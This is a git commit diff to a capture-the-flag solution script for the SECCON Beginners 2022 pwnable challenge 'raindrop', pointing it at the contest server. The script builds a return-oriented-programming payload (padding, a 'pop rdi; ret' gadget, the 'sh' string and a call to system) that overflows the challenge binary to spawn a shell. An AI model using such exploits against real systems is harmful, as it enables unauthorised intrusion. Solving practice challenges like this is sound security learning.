d05bacdbc1fc41583b4523cdd954a3590f98512e
zukash <48586209+zukash@users.noreply.github.com>
2024-11-22 23:31:14 +0900

    Add 2022/SECCONBeginners/raindrop

--- 2022/SECCONBeginners/pwnable/raindrop/solve.py
+++ 2022/SECCONBeginners/pwnable/raindrop/solve.py
@@ -3,12 +3,12 @@ from ctftools.pwn.common import connect
 from ctftools.pwn.search import objdump_search
 
 exe = ELF("chall")
-io = connect(exe, "host", 1337)
+io = connect(exe, "raindrop.quals.beginners.seccon.jp", 9001)
 
 rop = ROP(exe)
 payload = flat(
     bytes(0x18),
-    rop.find_gadget(['pop rdi', 'ret'])[0],
+    rop.find_gadget(["pop rdi", "ret"])[0],
     next(exe.search(b"sh\x00")),
     pack(objdump_search("chall", ["call", "system"])[0]),
 )
